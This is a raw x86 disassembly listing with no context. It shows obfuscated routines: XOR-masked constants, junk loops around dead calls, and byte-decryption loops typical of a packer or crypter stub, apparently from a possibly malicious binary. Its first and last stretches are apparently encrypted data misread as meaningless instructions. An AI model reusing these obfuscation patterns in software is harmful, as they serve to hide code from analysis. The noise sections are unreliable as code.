  407f02:	jecxz  0x407ee6
  407f04:	push   cs
  407f05:	(bad)  
  407f06:	out    dx,al
  407f07:	cs xor ebx,edi
  407f0a:	mov    dh,0x9b
  407f0c:	and    DWORD PTR [edx],edx
  407f0e:	popa   
  407f0f:	popa   
  407f10:	push   eax
  407f11:	jnp    0x407f0f
  407f13:	sub    al,BYTE PTR [edi+0x49628ca0]
  407f19:	jb     0x407ec3
  407f1b:	cli    
  407f1c:	int    0xac
  407f1e:	sub    bl,0x57
  407f21:	mov    ah,0xb7
  407f23:	mov    al,0xd
  407f25:	jmp    0xa641b5f2
  407f2a:	bound  ecx,QWORD PTR [ecx-0x3713f616]
  407f30:	xchg   edi,eax
  407f31:	mov    eax,cr3
  407f34:	pop    ss
  407f35:	pop    ecx
  407f36:	fisttp QWORD PTR [esi]
  407f38:	xor    BYTE PTR [ebp-0x10592a3],bl
  407f3e:	je     0x407fbc
  407f40:	ror    DWORD PTR [ecx-0x76],1
  407f43:	leave  
  407f44:	in     al,0x9d
  407f46:	sub    bl,bh
  407f48:	add    esp,DWORD PTR [ecx+ebp*8-0x41]
  407f4c:	rcr    BYTE PTR [edx],1
  407f4e:	dec    edi
  407f4f:	fisubr WORD PTR [ebp+0x48]
  407f52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f53:	daa    
  407f54:	jne    0x4080f8
  407f5a:	mov    eax,DWORD PTR [ebp-0xc]
  407f5d:	neg    ecx
  407f5f:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  407f66:	adc    ecx,eax
  407f68:	mov    eax,DWORD PTR [ebp-0x28]
  407f6b:	mov    ecx,DWORD PTR [ebp-0x18]
  407f6e:	not    DWORD PTR ds:0x42a2da
  407f74:	xor    eax,esi
  407f76:	or     DWORD PTR ds:0x42a2fa,0xa4f
  407f80:	xor    ecx,esi
  407f82:	or     DWORD PTR ds:0x42a26a,0x42a2f6
  407f8c:	add    eax,edi
  407f8e:	add    ecx,edi
  407f90:	mov    BYTE PTR [ebp-0x21],dl
  407f93:	cmp    eax,ecx
  407f95:	jae    0x408098
  407f9b:	add    edx,DWORD PTR ds:0x42a2a2
  407fa1:	lea    ecx,[eax-0x3272f1]
  407fa7:	mov    DWORD PTR [ebp-0x14],ecx
  407faa:	sub    DWORD PTR ds:0x42a27a,0x2374
  407fb4:	mov    edx,DWORD PTR [ebp-0x14]
  407fb7:	add    DWORD PTR ds:0x42a2a2,0x6412
  407fc1:	xor    edx,esi
  407fc3:	add    edx,0x7f55d8fb
  407fc9:	lea    ecx,[ebp+eax*4-0xb4]
  407fd0:	mov    DWORD PTR ds:0x42a25a,0x798e
  407fda:	mov    DWORD PTR [ecx],edx
  407fdc:	mov    edx,0x1097
  407fe1:	mov    edx,DWORD PTR [ecx]
  407fe3:	cmp    edx,0x244ecb98
  407fe9:	jbe    0x408004
  407fef:	xor    DWORD PTR ds:0x42a29a,0x42a2d6
  407ff9:	add    DWORD PTR [ecx],0x405fcd9
  407fff:	jmp    0x40800a
  408004:	add    DWORD PTR [ecx],0xfdaf4327
  40800a:	or     DWORD PTR ds:0x42a2f6,edi
  408010:	mov    ecx,DWORD PTR [ebp-0x18]
  408013:	xor    ecx,esi
  408015:	and    DWORD PTR ds:0x42a25e,0x42a27a
  40801f:	inc    eax
  408020:	and    DWORD PTR ds:0x42a2aa,0x42a2a6
  40802a:	inc    DWORD PTR [ebp-0x14]
  40802d:	add    ecx,edi
  40802f:	mov    DWORD PTR ds:0x42a2f6,0x14dc
  408039:	cmp    eax,ecx
  40803b:	mov    DWORD PTR ds:0x42a2fe,0x33af
  408045:	jb     0x407faa
  40804b:	and    DWORD PTR ds:0x42a25e,0x0
  408055:	mov    eax,ds:0x42a25e
  40805a:	inc    eax
  40805b:	mov    ds:0x42a25e,eax
  408060:	cmp    DWORD PTR ds:0x42a25e,0x1c
  408067:	jb     0x408095
  40806d:	jmp    0x408088
  408072:	push   0x6d6b
  408077:	push   0x44a2
  40807c:	push   DWORD PTR [ebp-0x14]
  40807f:	push   DWORD PTR [ebp-0x18]
  408082:	call   DWORD PTR ds:0x42a3de
  408088:	cmp    DWORD PTR ds:0x42a25e,0x18
  40808f:	jb     0x408055
  408095:	mov    dl,BYTE PTR [ebp-0x21]
  408098:	mov    eax,DWORD PTR [ebp-0x34]
  40809b:	xor    al,0xaa
  40809d:	mov    cl,0xf
  40809f:	xor    DWORD PTR ds:0x42a2b2,0x7a5d
  4080a9:	sub    cl,al
  4080ab:	add    dl,cl
  4080ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  4080b0:	xor    DWORD PTR ds:0x42a2d2,0x74a5
  4080ba:	xor    cl,0xaa
  4080bd:	xor    DWORD PTR ds:0x42a296,0x4bb3
  4080c7:	sub    cl,0xf
  4080ca:	add    DWORD PTR ds:0x42a2d6,0x42a2da
  4080d4:	ror    dl,cl
  4080d6:	sub    ecx,0x38f7
  4080dc:	xor    eax,eax
  4080de:	xor    DWORD PTR ds:0x42a2d2,0x8c7
  4080e8:	mov    eax,DWORD PTR [ebp-0xc]
  4080eb:	dec    DWORD PTR ds:0x42a266
  4080f1:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  4080f8:	and    DWORD PTR ds:0x42a296,0x0
  408102:	mov    eax,ds:0x42a296
  408107:	inc    eax
  408108:	mov    ds:0x42a296,eax
  40810d:	cmp    DWORD PTR ds:0x42a296,0x27
  408114:	ja     0x408132
  40811a:	jmp    0x408125
  40811f:	call   DWORD PTR ds:0x42a3e2
  408125:	cmp    DWORD PTR ds:0x42a296,0x1b
  40812c:	jb     0x408102
  408132:	mov    eax,DWORD PTR [ebp-0xc]
  408135:	xor    ecx,DWORD PTR ds:0x42a2c6
  40813b:	mov    ecx,DWORD PTR [ebp-0x28]
  40813e:	sub    DWORD PTR ds:0x42a2ce,0x42a2f2
  408148:	sub    eax,edi
  40814a:	and    DWORD PTR ds:0x42a25a,0x42a2f2
  408154:	xor    eax,esi
  408156:	mov    DWORD PTR ds:0x42a296,0x3de6
  408160:	cmp    eax,ecx
  408162:	mov    DWORD PTR ds:0x42a292,0x568e
  40816c:	jne    0x408200
  408172:	add    ecx,eax
  408174:	mov    eax,DWORD PTR [ebp-0x8]
  408177:	and    DWORD PTR ds:0x42a2ee,0x0
  408181:	mov    ecx,DWORD PTR ds:0x42a2ee
  408187:	inc    ecx
  408188:	mov    DWORD PTR ds:0x42a2ee,ecx
  40818e:	cmp    DWORD PTR ds:0x42a2ee,0x6
  408195:	jbe    0x4081df
  40819b:	jmp    0x4081b8
  4081a0:	push   0x42a296
  4081a5:	push   DWORD PTR [ebp-0x20]
  4081a8:	push   0x42903c
  4081ad:	push   0x4290aa
  4081b2:	call   DWORD PTR ds:0x42a3ea
  4081b8:	cmp    DWORD PTR ds:0x42a2ee,0x5
  4081bf:	jne    0x4081d2
  4081c5:	mov    ecx,DWORD PTR ds:0x42a2ee
  4081cb:	inc    ecx
  4081cc:	mov    DWORD PTR ds:0x42a2ee,ecx
  4081d2:	cmp    DWORD PTR ds:0x42a2ee,0x15
  4081d9:	jb     0x408181
  4081df:	mov    ecx,DWORD PTR [ebp-0x10]
  4081e2:	xor    eax,esi
  4081e4:	xor    ecx,esi
  4081e6:	sub    eax,ecx
  4081e8:	sub    eax,edi
  4081ea:	xor    eax,esi
  4081ec:	mov    DWORD PTR [ebp-0x8],eax
  4081ef:	mov    eax,DWORD PTR [ebp-0x10]
  4081f2:	xor    eax,esi
  4081f4:	mov    ecx,0xffcd8d8f
  4081f9:	sub    ecx,eax
  4081fb:	jmp    0x40820f
  408200:	mov    eax,DWORD PTR [ebp-0x10]
  408203:	xor    eax,esi
  408205:	mov    ecx,0xffcd8d0f
  40820a:	sub    ecx,eax
  40820c:	add    ecx,DWORD PTR [ebp-0xc]
  40820f:	mov    DWORD PTR [ebp-0xc],ecx
  408212:	mov    eax,DWORD PTR [ebp-0x8]
  408215:	cmp    eax,0xf89c85a5
  40821a:	jne    0x4037d5
  408220:	mov    DWORD PTR [ebp-0x34],0x9
  408227:	mov    ecx,DWORD PTR [ebp+0x8]
  40822a:	xor    ecx,esi
  40822c:	add    ecx,edi
  40822e:	jmp    0x40848e
  408233:	lea    eax,[ecx+ebx*1]
  408236:	mov    DWORD PTR [ebp-0x2c],eax
  408239:	mov    eax,DWORD PTR [ebp-0x58]
  40823c:	sub    eax,ecx
  40823e:	mov    DWORD PTR [ebp-0x1c],eax
  408241:	mov    eax,DWORD PTR [ebp-0x1c]
  408244:	mov    DWORD PTR [ebp-0x14],eax
  408247:	mov    eax,DWORD PTR [ebp-0x2c]
  40824a:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  408251:	mov    DWORD PTR [ebp-0x54],eax
  408254:	mov    DWORD PTR [ebp-0x20],0xf89c85ba
  40825b:	mov    eax,DWORD PTR [ebp-0x38]
  40825e:	xor    eax,esi
  408260:	add    eax,edi
  408262:	mov    DWORD PTR [ebp-0x10],eax
  408265:	mov    eax,DWORD PTR [ebp-0x38]
  408268:	xor    eax,esi
  40826a:	add    eax,edi
  40826c:	mov    DWORD PTR [ebp-0x8],eax
  40826f:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  408276:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  40827d:	mov    eax,DWORD PTR [ebp-0x38]
  408280:	mov    edx,DWORD PTR [ebp-0x14]
  408283:	xor    eax,esi
  408285:	add    eax,edi
  408287:	cmp    edx,eax
  408289:	je     0x408482
  40828f:	mov    eax,DWORD PTR [ebp-0x20]
  408292:	xor    eax,esi
  408294:	mov    edx,0xffcd8d0f
  408299:	sub    edx,eax
  40829b:	add    edx,DWORD PTR [ebp-0x14]
  40829e:	mov    eax,DWORD PTR [ebp-0x20]
  4082a1:	mov    ebx,DWORD PTR [ebp-0x10]
  4082a4:	xor    eax,esi
  4082a6:	add    eax,edi
  4082a8:	imul   eax,ebx
  4082ab:	cmp    eax,edx
  4082ad:	ja     0x40847f
  4082b3:	mov    edx,DWORD PTR [ebp-0x10]
  4082b6:	mov    eax,DWORD PTR [ebp-0x14]
  4082b9:	mov    ebx,DWORD PTR [ebp-0x2c]
  4082bc:	sub    eax,edx
  4082be:	xor    ebx,esi
  4082c0:	xor    edx,edx
  4082c2:	add    ebx,edi
  4082c4:	div    ebx
  4082c6:	mov    DWORD PTR [ebp-0x8],eax
  4082c9:	mov    eax,DWORD PTR [ebp-0x44]
  4082cc:	mov    edx,DWORD PTR [ebp-0x8]
  4082cf:	xor    eax,esi
  4082d1:	add    eax,edi
  4082d3:	cmp    edx,eax
  4082d5:	jbe    0x4082e5
  4082db:	mov    eax,DWORD PTR [ebp-0x44]
  4082de:	xor    eax,esi
  4082e0:	add    eax,edi
  4082e2:	mov    DWORD PTR [ebp-0x8],eax
  4082e5:	mov    eax,DWORD PTR [ebp-0x2c]
  4082e8:	mov    edx,DWORD PTR [ebp-0x8]
  4082eb:	xor    eax,esi
  4082ed:	add    eax,edi
  4082ef:	imul   eax,edx
  4082f2:	mov    DWORD PTR [ebp-0x8],eax
  4082f5:	mov    eax,DWORD PTR [ebp-0x38]
  4082f8:	mov    edx,DWORD PTR [ebp-0x8]
  4082fb:	xor    eax,esi
  4082fd:	add    eax,edi
  4082ff:	cmp    edx,eax
  408301:	je     0x408468
  408307:	mov    eax,DWORD PTR [ebp-0x8]
  40830a:	mov    DWORD PTR [ebp-0x18],eax
  40830d:	mov    eax,DWORD PTR [ebp-0x10]
  408310:	add    eax,DWORD PTR [ebp-0x54]
  408313:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  40831a:	mov    DWORD PTR [ebp-0x8],eax
  40831d:	mov    eax,0xf89c85ba
  408322:	mov    DWORD PTR [ebp-0x28],eax
  408325:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40832c:	mov    DWORD PTR [ebp-0x40],0xf89c85b8
  408333:	mov    DWORD PTR [ebp-0x30],eax
  408336:	mov    eax,DWORD PTR [ebp-0x1c]
  408339:	xor    eax,esi
  40833b:	add    eax,edi
  40833d:	jmp    0x408424
  408342:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  408349:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  408350:	mov    eax,DWORD PTR [ebp-0x30]
  408353:	mov    edx,DWORD PTR [ebp-0xc]
  408356:	xor    eax,esi
  408358:	add    eax,edi
  40835a:	imul   eax,edx
  40835d:	mov    edx,DWORD PTR [ebp-0x8]
  408360:	mov    al,BYTE PTR [eax+edx*1]
  408363:	mov    BYTE PTR [ebp-0x1],al
  408366:	mov    eax,DWORD PTR [ebp-0x30]
  408369:	mov    edx,DWORD PTR [ebp-0xc]
  40836c:	xor    eax,esi
  40836e:	add    eax,edi
  408370:	imul   eax,edx
  408373:	mov    edx,DWORD PTR [ebp-0x5c]
  408376:	xor    edx,esi
  408378:	add    eax,edx
  40837a:	mov    edx,DWORD PTR [ebp-0x8]
  40837d:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  408385:	mov    edx,DWORD PTR [ebp-0x4c]
  408388:	xor    edx,esi
  40838a:	lea    eax,[edx+eax*1+0x3272f1]
  408391:	movzx  edx,BYTE PTR [ebp-0x1]
  408395:	xor    edx,eax
  408397:	mov    BYTE PTR [ebp-0x1],dl
  40839a:	mov    al,BYTE PTR [ebp-0x1]
  40839d:	mov    edx,DWORD PTR [ebp-0x30]
  4083a0:	mov    ebx,DWORD PTR [ebp-0xc]
  4083a3:	xor    edx,esi
  4083a5:	add    edx,edi
  4083a7:	imul   edx,ebx
  4083aa:	mov    ebx,DWORD PTR [ebp-0x8]
  4083ad:	mov    BYTE PTR [edx+ebx*1],al
  4083b0:	mov    eax,DWORD PTR [ebp-0x30]
  4083b3:	mov    edx,DWORD PTR [ebp-0xc]
  4083b6:	xor    eax,esi
  4083b8:	add    eax,edi
  4083ba:	imul   eax,edx
  4083bd:	mov    edx,DWORD PTR [ebp-0x8]
  4083c0:	mov    al,BYTE PTR [eax+edx*1]
  4083c3:	mov    BYTE PTR [ebp-0x1],al
  4083c6:	mov    eax,DWORD PTR [ebp-0x30]
  4083c9:	mov    edx,DWORD PTR [ebp-0xc]
  4083cc:	xor    eax,esi
  4083ce:	add    eax,edi
  4083d0:	imul   eax,edx
  4083d3:	mov    edx,DWORD PTR [ebp-0x28]
  4083d6:	xor    edx,esi
  4083d8:	add    eax,edx
  4083da:	mov    edx,DWORD PTR [ebp-0x8]
  4083dd:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  4083e5:	mov    edx,DWORD PTR [ebp-0x50]
  4083e8:	xor    edx,esi
  4083ea:	lea    eax,[edx+eax*1+0x3272f1]
  4083f1:	movzx  edx,BYTE PTR [ebp-0x1]
  4083f5:	xor    edx,eax
  4083f7:	mov    BYTE PTR [ebp-0x1],dl
  4083fa:	mov    al,BYTE PTR [ebp-0x1]
  4083fd:	mov    edx,DWORD PTR [ebp-0x30]
  408400:	mov    ebx,DWORD PTR [ebp-0xc]
  408403:	xor    edx,esi
  408405:	add    edx,edi
  408407:	imul   edx,ebx
  40840a:	mov    ebx,DWORD PTR [ebp-0x8]
  40840d:	mov    BYTE PTR [edx+ebx*1],al
  408410:	mov    eax,DWORD PTR [ebp-0x40]
  408413:	mov    edx,DWORD PTR [ebp-0x28]
  408416:	xor    eax,esi
  408418:	xor    edx,esi
  40841a:	add    eax,edi
  40841c:	add    edx,edi
  40841e:	imul   eax,edx
  408421:	add    eax,DWORD PTR [ebp-0xc]
  408424:	mov    DWORD PTR [ebp-0xc],eax
  408427:	mov    eax,DWORD PTR [ebp-0xc]
  40842a:	mov    edx,DWORD PTR [ebp-0x18]
  40842d:	cmp    edx,eax
  40842f:	jb     0x408342
  408435:	mov    eax,DWORD PTR [ebp-0x28]
  408438:	mov    edx,DWORD PTR [ebp-0x18]
  40843b:	xor    eax,esi
  40843d:	add    eax,edi
  40843f:	imul   eax,edx
  408442:	mov    edx,DWORD PTR [ebp-0x1c]
  408445:	xor    edx,esi
  408447:	add    edx,edi
  408449:	or     eax,edx
  40844b:	mov    edx,DWORD PTR [ebp-0x20]
  40844e:	xor    edx,esi
  408450:	add    eax,edx
  408452:	mov    edx,DWORD PTR [ebp-0x20]
  408455:	xor    edx,esi
  408457:	add    eax,edx
  408459:	mov    edx,DWORD PTR [ebp-0x10]
  40845c:	lea    eax,[eax+edx*1+0x64e5e2]
  408463:	jmp    0x408477
  408468:	mov    eax,DWORD PTR [ebp-0x20]
  40846b:	mov    edx,DWORD PTR [ebp-0x10]
  40846e:	xor    eax,esi
  408470:	lea    eax,[eax+edx*1+0x3272f1]
  408477:	mov    DWORD PTR [ebp-0x10],eax
  40847a:	jmp    0x40828f
  40847f:	mov    ebx,DWORD PTR [ebp-0x3c]
  408482:	mov    eax,DWORD PTR [ebp+0xc]
  408485:	xor    eax,esi
  408487:	lea    ecx,[ecx+eax*1+0x3272f1]
  40848e:	lea    eax,[ecx-0x3272f1]
  408494:	xor    eax,esi
  408496:	cmp    eax,0xf89c95a5
  40849b:	jne    0x408233
  4084a1:	dec    DWORD PTR [ebp-0x34]
  4084a4:	jne    0x408227
  4084aa:	mov    eax,DWORD PTR [ebp+0x8]
  4084ad:	mov    ecx,DWORD PTR [ebp+0xc]
  4084b0:	mov    edx,DWORD PTR [ebp+0x8]
  4084b3:	xor    ecx,esi
  4084b5:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f1]
  4084bc:	xor    eax,esi
  4084be:	mov    al,BYTE PTR [eax+ebx*1+0x3272f1]
  4084c5:	xor    edx,esi
  4084c7:	mov    BYTE PTR [edx+ebx*1+0x3272f1],cl
  4084ce:	mov    ecx,DWORD PTR [ebp+0xc]
  4084d1:	xor    ecx,esi
  4084d3:	mov    BYTE PTR [ecx+ebx*1+0x3272f1],al
  4084da:	mov    eax,DWORD PTR [ebp+0xc]
  4084dd:	xor    eax,esi
  4084df:	add    eax,edi
  4084e1:	pop    edi
  4084e2:	pop    esi
  4084e3:	pop    ebx
  4084e4:	leave  
  4084e5:	ret    0x8
  4084e8:	xor    eax,eax
  4084ea:	and    DWORD PTR ds:0x42a2f6,0x42a2fa
  4084f4:	inc    eax
  4084f5:	ret    
  4084f6:	push   ebp
  4084f7:	mov    ebp,esp
  4084f9:	sub    esp,0x38
  4084fc:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  408503:	push   ebx
  408504:	mov    DWORD PTR ds:0x42a29a,0x1c
  40850e:	cmp    DWORD PTR ds:0x42a29a,0x0
  408515:	je     0x408551
  40851b:	cmp    DWORD PTR ds:0x42a29a,0x21
  408522:	jg     0x408551
  408528:	jmp    0x40853e
  40852d:	push   DWORD PTR [ebp-0x28]
  408530:	push   0x42a2b2
  408535:	push   DWORD PTR [ebp-0x18]
  408538:	call   DWORD PTR ds:0x42a3ee
  40853e:	xor    eax,eax
  408540:	xor    eax,DWORD PTR ds:0x42a29a
  408546:	dec    eax
  408547:	mov    ds:0x42a29a,eax
  40854c:	jmp    0x40850e
  408551:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  408558:	and    DWORD PTR ds:0x42a292,ebx
  40855e:	mov    eax,DWORD PTR [ebp-0x4]
  408561:	push   esi
  408562:	mov    esi,0x75108aa
  408567:	sub    DWORD PTR ds:0x42a28a,0x606e
  408571:	xor    eax,esi
  408573:	push   edi
  408574:	mov    edi,0x3272f1
  408579:	add    eax,edi
  40857b:	add    DWORD PTR ds:0x42a28e,0x42a2ae
  408585:	mov    DWORD PTR [ebp-0x1c],eax
  408588:	mov    eax,DWORD PTR [ebp+0x14]
  40858b:	xor    DWORD PTR ds:0x42a2de,0x42a302
  408595:	test   eax,eax
  408597:	je     0x4085af
  40859d:	mov    eax,DWORD PTR [ebp+0x14]
  4085a0:	adc    DWORD PTR ds:0x42a26e,0x42a2ca
  4085aa:	mov    eax,DWORD PTR [eax]
  4085ac:	mov    DWORD PTR [ebp-0x1c],eax
  4085af:	mov    ebx,DWORD PTR ds:0x42a256
  4085b5:	and    DWORD PTR ds:0x42a2e6,ebx
  4085bb:	mov    eax,DWORD PTR [ebp-0x4]
  4085be:	xor    eax,esi
  4085c0:	adc    DWORD PTR ds:0x42a2c6,0x7b40
  4085ca:	add    eax,edi
  4085cc:	xor    DWORD PTR ds:0x42a2c6,0x5a4b
  4085d6:	mov    DWORD PTR [ebp-0x8],eax
  4085d9:	mov    eax,DWORD PTR [ebp-0xc]
  4085dc:	dec    DWORD PTR ds:0x42a2be
  4085e2:	xor    eax,esi
  4085e4:	add    eax,edi
  4085e6:	and    DWORD PTR ds:0x42a2be,0x0
  4085f0:	jmp    0x408602
  4085f5:	mov    ebx,DWORD PTR ds:0x42a2be
  4085fb:	inc    ebx
  4085fc:	mov    DWORD PTR ds:0x42a2be,ebx
  408602:	cmp    DWORD PTR ds:0x42a2be,0x13
  408609:	jae    0x408650
  40860f:	cmp    DWORD PTR ds:0x42a2be,0x4
  408616:	jb     0x408650
  40861c:	jmp    0x408631
  408621:	push   0x68db
  408626:	push   0x42a266
  40862b:	call   DWORD PTR ds:0x42a3f2
  408631:	cmp    DWORD PTR ds:0x42a2be,0x3
  408638:	jne    0x40864b
  40863e:	mov    ebx,DWORD PTR ds:0x42a2be
  408644:	inc    ebx
  408645:	mov    DWORD PTR ds:0x42a2be,ebx
  40864b:	jmp    0x4085f5
  408650:	mov    DWORD PTR [ebp-0x24],eax
  408653:	mov    ebx,DWORD PTR ds:0x42a316
  408659:	mov    ebx,DWORD PTR [ebx]
  40865b:	xor    DWORD PTR ds:0x42a2ae,ebx
  408661:	mov    eax,DWORD PTR [ebp-0x4]
  408664:	mov    DWORD PTR ds:0x42a2fa,0x14
  40866e:	cmp    DWORD PTR ds:0x42a2fa,0x0
  408675:	je     0x4086aa
  40867b:	cmp    DWORD PTR ds:0x42a2fa,0x16
  408682:	jbe    0x4086aa
  408688:	jmp    0x408698
  40868d:	push   0x42a256
  408692:	call   DWORD PTR ds:0x42a3f6
  408698:	mov    ebx,DWORD PTR ds:0x42a2fa
  40869e:	dec    ebx
  40869f:	mov    DWORD PTR ds:0x42a2fa,ebx
  4086a5:	jmp    0x40866e
  4086aa:	xor    eax,esi
  4086ac:	movzx  ebx,BYTE PTR ds:0x42a2aa
  4086b3:	adc    ebx,DWORD PTR ds:0x42a2de
  4086b9:	mov    DWORD PTR ds:0x42a2aa,ebx
  4086bf:	add    eax,edi
  4086c1:	mov    DWORD PTR ds:0x42a29e,0x16
  4086cb:	cmp    DWORD PTR ds:0x42a29e,0x0
  4086d2:	je     0x408713
  4086d8:	cmp    DWORD PTR ds:0x42a29e,0x1e
  4086df:	jle    0x408713
  4086e5:	jmp    0x4086ff
  4086ea:	push   0x8495
  4086ef:	push   0x42a2a2
  4086f4:	push   0x13ea
  4086f9:	call   DWORD PTR ds:0x42a3fa
  4086ff:	xor    ebx,ebx
  408701:	add    ebx,DWORD PTR ds:0x42a29e
  408707:	dec    ebx
  408708:	mov    DWORD PTR ds:0x42a29e,ebx
  40870e:	jmp    0x4086cb
  408713:	mov    DWORD PTR [ebp-0x30],eax
  408716:	sub    DWORD PTR ds:0x42a2b2,0x244c
  408720:	mov    ebx,DWORD PTR [ebp-0x4]
  408723:	xor    ebx,esi
  408725:	neg    DWORD PTR ds:0x42a2f6
  40872b:	add    ebx,edi
  40872d:	and    DWORD PTR ds:0x42a2ba,0x0
  408737:	xor    eax,eax
  408739:	or     eax,DWORD PTR ds:0x42a2ba
  40873f:	inc    eax
  408740:	mov    ds:0x42a2ba,eax
  408745:	cmp    DWORD PTR ds:0x42a2ba,0x6
  40874c:	jg     0x408791
  408752:	jmp    0x40876c
  408757:	push   0x385f
  40875c:	push   0x7a18
  408761:	push   0x5bac
  408766:	call   DWORD PTR ds:0x42a402
  40876c:	cmp    DWORD PTR ds:0x42a2ba,0x5
  408773:	jne    0x408784
  408779:	mov    eax,ds:0x42a2ba
  40877e:	inc    eax
  40877f:	mov    ds:0x42a2ba,eax
  408784:	cmp    DWORD PTR ds:0x42a2ba,0x13
  40878b:	jb     0x408737
  408791:	mov    eax,DWORD PTR [ebp-0x24]
  408794:	add    DWORD PTR ds:0x42a27e,0x42a26e
  40879e:	sub    eax,edi
  4087a0:	lea    ecx,[ebx-0x3272f1]
  4087a6:	xor    eax,esi
  4087a8:	sbb    DWORD PTR ds:0x42a286,0x7a3b
  4087b2:	jmp    0x40ab40
  4087b7:	inc    esp
  4087b8:	arpl   WORD PTR [esi+esi*8],di
  4087bb:	and    al,0x96
  4087bd:	xchg   ch,cl
  4087bf:	sahf   
  4087c0:	pushf  
  4087c1:	ja     0x4087a5
  4087c3:	fmul   st(4),st
  4087c5:	fcom   DWORD PTR [edx]
  4087c7:	iret   
  4087c8:	adc    al,0x83
  4087ca:	or     DWORD PTR [esi+ebx*2],0xffffff83
  4087ce:	and    DWORD PTR [ecx+edx*1+0x395e1f3e],0x44
  4087d6:	push   0xffffffb3
  4087d8:	jecxz  0x4087e9
  4087da:	push   es
  4087db:	mov    edi,DWORD PTR [ecx+ecx*1+0x7d3be0b0]
  4087e2:	call   0x155080df
  4087e7:	mov    eax,ds:0x5afa0de2
  4087ec:	sub    edi,DWORD PTR [ebx-0x27]
  4087ef:	xor    edi,DWORD PTR [edi+0x18d815df]
  4087f5:	push   0x28
  4087f7:	push   cs
  4087f8:	(bad)  
  4087f9:	xor    BYTE PTR [edx],dh
  4087fb:	(bad)  
  4087fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087fd:	aad    0xeb
  4087ff:	ror    BYTE PTR [eax+0x4d28a04a],cl
  408805:	jmp    0x9fc6:0x32d6d64d
  40880c:	dec    edi
  40880d:	arpl   WORD PTR [ebx+0x691534db],dx
  408813:	cmc    
  408814:	iret   
  408815:	ins    BYTE PTR es:[edi],dx
  408816:	and    BYTE PTR [bp+si-0x3ea6],dh
  40881b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40881c:	int    0xfd
  40881e:	mov    edx,0x38aceec2
  408823:	cmc    
  408824:	loopne 0x408831
  408826:	pop    eax
  408827:	sbb    ecx,DWORD PTR [edi+0xa6345a7]
  40882d:	arpl   bx,dx
  40882f:	inc    eax
  408830:	cld    
  408831:	loopne 0x408865
  408833:	test   al,0xb3
  408835:	ret    
  408836:	jp     0x408870
  408838:	push   edi
  408839:	push   esp
  40883a:	mov    al,ds:0xc83e235c
  40883f:	mov    ebx,0xe52f1287
  408844:	or     edi,DWORD PTR [ebp-0x11]
  408847:	iret   
  408848:	jl     0x4087d9
  40884a:	dec    ebp
  40884b:	int3   
  40884c:	push   ds
  40884d:	jae    0x40881a
  40884f:	inc    esi
  408850:	dec    esp
  408851:	cmp    BYTE PTR [ebx-0x61],bh
  408854:	fcomp  st(3)
  408856:	fsubr  QWORD PTR [ebx-0x7fdeecb0]
  40885c:	call   DWORD PTR [eax]
  40885e:	jge    0x408824
  408860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408861:	push   ebx
  408862:	dec    edi
  408863:	pop    edi
  408864:	adc    dh,BYTE PTR [eax-0x5cbe85a3]
  40886a:	xchg   edx,eax
  40886b:	stos   BYTE PTR es:[edi],al
  40886c:	je     0x4087f7
  40886e:	dec    BYTE PTR [edx+0x1f59b7e3]
  408874:	jmp    0x737b:0xb398b431
  40887b:	xchg   ebx,eax
  40887c:	(bad)  
  40887d:	jmp    0xbb73c8d5
  408882:	aam    0x9a
  408884:	sbb    eax,0x67469449
  408889:	test   DWORD PTR [edi-0x38],ecx
  40888c:	fcmovnb st,st(0)
  40888e:	jle    0x40890f
  408890:	sub    esp,DWORD PTR [esi]
  408892:	add    esi,DWORD PTR ds:0xb4b578c2
  408898:	cmp    al,0x66
  40889a:	icebp  
  40889b:	pop    eax
  40889c:	jp     0x408878
  40889e:	mov    ah,BYTE PTR [ecx+eiz*2]
  4088a1:	pop    ss
  4088a2:	mov    cl,0x72
  4088a4:	gs ss push edx
  4088a7:	xor    DWORD PTR [eax-0x6588706b],edi
  4088ad:	and    ebp,DWORD PTR ds:0x9c49adce
  4088b3:	inc    esp
  4088b4:	retf   
  4088b5:	push   ebp
  4088b6:	and    edi,0xffffffec
  4088b9:	xor    eax,0xa0a2232
  4088be:	xchg   ebx,eax
  4088bf:	cdq    
  4088c0:	jmp    0x40885a
  4088c2:	sar    DWORD PTR [eax+0x827bfc6],cl
  4088c8:	shl    BYTE PTR [edx-0x6b3f9e52],1
  4088ce:	shl    BYTE PTR [edx-0x2fdc3efe],cl
  4088d4:	mov    cl,0x41
  4088d6:	out    dx,al
  4088d7:	fdiv   st,st(2)
  4088d9:	imul   BYTE PTR [ecx-0x38]
  4088dc:	test   al,0xfc
  4088de:	je     0x408883
  4088e0:	and    BYTE PTR [eax-0x70a93cc3],0x1f
  4088e7:	mov    esi,0x8f3eb414
  4088ec:	fstp   st(4)
  4088ee:	pop    edi
  4088ef:	in     eax,dx
  4088f0:	mov    al,0x79
  4088f2:	je     0x408965
  4088f4:	gs mov esp,eax
  4088f7:	inc    eax
  4088f8:	sub    edx,esi
  4088fa:	test   DWORD PTR [ecx-0x54],ecx
  4088fd:	push   eax
  4088fe:	(bad)  
  408900:	out    dx,al
  408901:	mov    ebx,0xeb4b1550
  408906:	and    al,0x1b
  408908:	test   eax,0xa1ae698b
  40890d:	gs mov dl,0xdb
  408910:	mov    eax,0xa72295ea
  408915:	std    
  408916:	fist   DWORD PTR [ebp+0x44edb0b7]
  40891c:	sub    al,al
  40891e:	shl    DWORD PTR [ecx],0x88
  408921:	sub    edx,DWORD PTR [eax]
  408923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408924:	in     eax,dx
  408925:	xor    cl,BYTE PTR [edx+0x33]
